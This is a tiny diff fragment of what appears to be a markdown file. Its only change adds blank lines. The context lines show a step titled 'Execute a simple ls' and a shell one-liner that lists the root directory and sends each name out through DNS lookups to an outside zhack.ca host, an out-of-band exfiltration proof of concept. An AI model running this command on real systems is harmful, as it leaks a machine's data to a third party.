@@ -16,3 +16,5 @@ updated_at: '2023-04-06T03:55:57.503235+00:00'
 2. Execute a simple 'ls'
 for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
+
+
